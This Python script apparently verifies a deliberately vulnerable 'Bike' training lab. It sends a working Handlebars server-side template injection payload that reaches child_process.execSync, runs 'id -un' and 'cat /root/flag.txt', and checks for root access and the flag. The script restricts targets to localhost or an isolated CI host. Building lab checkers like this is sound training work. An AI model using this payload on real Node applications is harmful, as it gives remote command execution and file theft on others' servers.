#!/usr/bin/env python3
"""Verify the intentionally vulnerable Bike lab. ONLY target your local lab."""
import argparse
import html
import sys
import urllib.error
import os
import urllib.parse
import urllib.request


def post(base_url, payload):
    data = urllib.parse.urlencode({'email': payload}).encode('utf-8')
    req = urllib.request.Request(base_url.rstrip('/') + '/', data=data, method='POST')
    try:
        with urllib.request.urlopen(req, timeout=8) as response:
            return response.status, html.unescape(response.read().decode('utf-8'))
    except urllib.error.HTTPError as err:
        return err.code, html.unescape(err.read().decode('utf-8'))


def handlebars_rce(js_expression):
    # Bike.pdf pp. 14-19: escape via string constructor, process.mainModule.require.
    return '''{{{{#with "s" as |string|}}}}
  {{{{#with "e"}}}}
    {{{{#with split as |conslist|}}}}
      {{{{this.pop}}}}
      {{{{this.push (lookup string.sub "constructor")}}}}
      {{{{this.pop}}}}
      {{{{#with string.split as |codelist|}}}}
        {{{{this.pop}}}}
        {{{{this.push "return {js_expression};"}}}}
        {{{{this.pop}}}}
        {{{{#each conslist}}}}
          {{{{#with (string.sub.apply 0 codelist)}}}}
            {{{{this}}}}
          {{{{/with}}}}
        {{{{/each}}}}
      {{{{/with}}}}
    {{{{/with}}}}
  {{{{/with}}}}
{{{{/with}}}}'''.format(js_expression=js_expression)


def check(name, predicate, details):
    if predicate:
        print('[PASS]', name)
        return True
    print('[FAIL]', name, details[:300].replace('\n', ' '), file=sys.stderr)
    return False


def main():
    parser = argparse.ArgumentParser(description='Verify Bike SSTI chain on an isolated training container')
    parser.add_argument('--url', default='http://127.0.0.1:8080')
    args = parser.parse_args()
    base = args.url.rstrip('/')
    parsed = urllib.parse.urlparse(base)
    allowed_local = parsed.scheme == 'http' and parsed.hostname in {'127.0.0.1', 'localhost'}
    allowed_internal = (
        os.environ.get('ALLOW_INTERNAL_TARGET') == '1'
        and parsed.scheme == 'http'
        and parsed.hostname == 'bike-target'
        and parsed.port == 80
    )
    if not (allowed_local or allowed_internal):
        parser.error('Only localhost or the isolated bike-target:80 CI network is accepted')
    expected_flag = os.environ.get('EXPECTED_FLAG', '')
    if not expected_flag:
        parser.error('EXPECTED_FLAG must contain the expected target Flag')
    passed = []
    status, body = post(base, 'student@example.invalid')
    passed.append(check('email reflected in response', status == 200 and 'student@example.invalid' in body, body))
    status, body = post(base, '{{7*7}}')
    passed.append(check('malformed Handlebars expression errors', status == 500 and 'Error' in body, body))
    status, body = post(base, handlebars_rce("process.mainModule.require('child_process').execSync('id -un')"))
    passed.append(check('SSTI -> child_process -> root', status == 200 and 'root' in body, body))
    status, body = post(base, handlebars_rce("process.mainModule.require('child_process').execSync('cat /root/flag.txt')"))
    passed.append(check('SSTI -> /root/flag.txt', status == 200 and expected_flag in body, body.replace(expected_flag, '[MASKED]')))
    if not all(passed):
        sys.exit(1)
    print('All Bike SSTI checks passed.')


if __name__ == '__main__':
    main()
